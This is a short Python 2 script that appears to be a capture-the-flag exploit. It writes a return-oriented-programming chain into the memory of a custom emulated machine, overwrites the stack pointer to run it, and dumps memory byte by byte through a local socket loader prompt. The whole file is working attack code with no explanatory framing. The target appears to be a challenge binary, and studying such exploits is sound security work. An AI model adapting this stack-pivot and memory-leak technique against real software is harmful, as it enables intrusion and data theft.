from asm import *
import hexdump, os, sys, time
from sock import Sock
import sys

# Byte swap a value
def swap(v):
    return (v % 256) * 256 + (v/256)

# Represent a code address
# Byte swapped value as word address
def format_addr(v):
    return swap(v/2 + 18)

movw_r24_r16_pop_4 = format_addr(0x4ea)
pop_r17_r16 = format_addr(0x4f0)
print_string_addr_r24_from_ram = format_addr(0x47c)

pop = []
addr = 0x700
dmp = ''
while True:
    chain = [pop_r17_r16,swap(addr+len(dmp)),movw_r24_r16_pop_4,0xdead,0xbeef,print_string_addr_r24_from_ram]

    if len(chain) % 2:
        chain += [0xffff]
    chain = chain[::-1]

    sp_addr = 0x5d
    rop_addr = 0x500
    
    # Write ROP chain to memory
    r = ""
    r += movh(r0,rop_addr/256)
    r += movl(r0,(rop_addr%256)*256)
    r += xor(r8,r8)
    r += xor(r8,r0)
    r += xor(r5,r5)
    r += xor(r2,r2)
    r += movl(r5,len(chain)*2-4)
    r += add(r2,r5)
    r += movl(r5,4)
    r += xor(r1,r1)
    for i in range(0,len(chain),2):
        r += movh(r1,chain[i])
        r += movl(r1,chain[i+1])
        r += stosb(r2,r1)
        r += sub(r2,r5)
    
    # Overwrite SP to call into ROP chain
    r += movh(r0,sp_addr/256)
    r += movl(r0,(sp_addr%256)*256)
    r += xor(r8,r8)
    r += xor(r8,r0)
    r += xor(r1,r1)
    r += xor(r2,r2)
    r += movh(r1,0)
    r += movl(r1,rop_addr-3)
    r += stosb(r2,r1) # overwrite sp and call ROP chain

    s = None
    while not s:
        try:
            print "Connecting..."
            s = Sock('127.0.0.1',1235)
        except:
            time.sleep(1)

    s.read_until('Loader> ')
    s.read_until('Loader> ')
    s.read_until('Loader> ')
    s.send(r + '\n')
    o = ''
    o += s.read_until('Loader> ')
    if o.startswith('\x1b[1;1H\x1b[2J\x1b[1;1H\x1b[2J'):
        o = o[len('\x1b[1;1H\x1b[2J\x1b[1;1H\x1b[2J'):]
    if o.endswith('Loader> '):
        o = o[:-1*len('Loader> ')]
    dmp += o + '\x00'
    hexdump.hexdump(dmp)
